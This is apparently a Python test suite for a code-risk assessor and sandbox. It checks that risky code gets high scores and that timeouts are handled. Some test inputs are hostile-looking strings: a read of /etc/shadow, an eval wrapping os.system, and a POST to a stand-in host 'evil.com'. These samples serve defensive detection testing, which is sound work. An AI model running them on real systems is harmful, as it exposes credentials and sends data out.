#!/usr/bin/env python3
"""
Expert Mode - 测试套件
Test-Driven Development
"""

import unittest
import sys
import json
import tempfile
import asyncio
from pathlib import Path

# 添加父目录
sys.path.insert(0, str(Path(__file__).parent.parent))

from expert_mode.risk_assessor import RiskRule, RiskAssessor, assess_code_risk
from expert_mode.expert_sandbox import SubprocessSandbox, BehaviorMonitor


class TestRiskRule(unittest.TestCase):
    """风险规则测试"""
    
    def test_safe_code(self):
        """安全代码应该得0分"""
        code = '''
print("hello world")
x = 1 + 2
def add(a, b):
    return a + b
'''
        result = assess_code_risk(code)
        self.assertEqual(result['risk_score'], 0)
        self.assertEqual(result['risk_level'], 'SAFE')
        
    def test_eval_risk(self):
        """eval应该检测为高风险"""
        code = 'eval("os.system(ls)")'
        result = assess_code_risk(code)
        self.assertGreater(result['risk_score'], 50)
        
    def test_etc_shadow(self):
        """读取/etc/shadow应该得高分"""
        code = 'open("/etc/shadow").read()'
        result = assess_code_risk(code)
        self.assertGreaterEqual(result['risk_score'], 80)
        
    def test_network_request(self):
        """网络请求应该被检测"""
        code = 'requests.post("http://evil.com")'
        result = assess_code_risk(code)
        self.assertGreater(result['risk_score'], 30)


class TestRiskAssessor(unittest.TestCase):
    """风险评估器测试"""
    
    def test_high_risk(self):
        """高风险应该返回CRITICAL"""
        assessor = RiskAssessor()
        findings = [
            {'pattern': '/etc/shadow', 'score': 100, 'severity': 'HIGH'}
        ]
        result = assessor.assess(findings)
        self.assertEqual(result['risk_level'], 'CRITICAL')
        
    def test_safe_level(self):
        """低风险应该返回SAFE"""
        assessor = RiskAssessor()
        findings = [
            {'pattern': 'print', 'score': 5, 'severity': 'LOW'}
        ]
        result = assessor.assess(findings)
        self.assertEqual(result['risk_level'], 'SAFE')


class TestSubprocessSandbox(unittest.TestCase):
    """沙箱执行器测试"""
    
    def setUp(self):
        self.sandbox = SubprocessSandbox()
        
    def test_safe_execution(self):
        """安全代码应该执行成功"""
        with tempfile.TemporaryDirectory() as tmpdir:
            # 创建skill目录和cli.py
            skill_dir = Path(tmpdir) / "test_skill"
            skill_dir.mkdir()
            (skill_dir / "cli.py").write_text('print("test")')
            
            sandbox = SubprocessSandbox()
            result = sandbox.execute(str(skill_dir))
            self.assertTrue(result['success'])
            self.assertEqual(result['risk_level'], 'SAFE')
            
    def test_timeout(self):
        """超时应该被处理"""
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = Path(tmpdir) / "cli.py"
            # 无限循环
            test_file.write_text('while True: pass')
            
            # 设置短超时
            self.sandbox.config['timeout_seconds'] = 2
            
            result = self.sandbox.execute(str(test_file))
            # 应该超时结束
            self.assertFalse(result['success'])


class TestAutoDecision(unittest.TestCase):
    """自动决策测试"""
    
    def test_auto_trigger_high_risk(self):
        """高风险应该自动触发专家模式"""
        # 测试逻辑
        score = 85
        threshold = 80
        should_trigger = score >= threshold
        self.assertTrue(should_trigger)
        
    def test_auto_pass_low_risk(self):
        """低风险应该直接通过"""
        score = 20
        threshold = 60
        should_trigger = score >= threshold
        self.assertFalse(should_trigger)


def run_tests():
    """运行所有测试"""
    print("\n" + "="*60)
    print("🧪 Expert Mode - 测试套件")
    print("="*60 + "\n")
    
    # 测试套件
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # 添加测试
    suite.addTests(loader.loadTestsFromTestCase(TestRiskRule))
    suite.addTests(loader.loadTestsFromTestCase(TestRiskAssessor))
    suite.addTests(loader.loadTestsFromTestCase(TestSubprocessSandbox))
    suite.addTests(loader.loadTestsFromTestCase(TestAutoDecision))
    
    # 运行
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    # 总结
    print("\n" + "="*60)
    print(f"📊 测试结果")
    print("="*60)
    print(f"✅ 通过: {result.testsRun - len(result.failures) - len(result.errors)}")
    print(f"❌ 失败: {len(result.failures)}")
    print(f"⚠️  错误: {len(result.errors)}")
    
    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
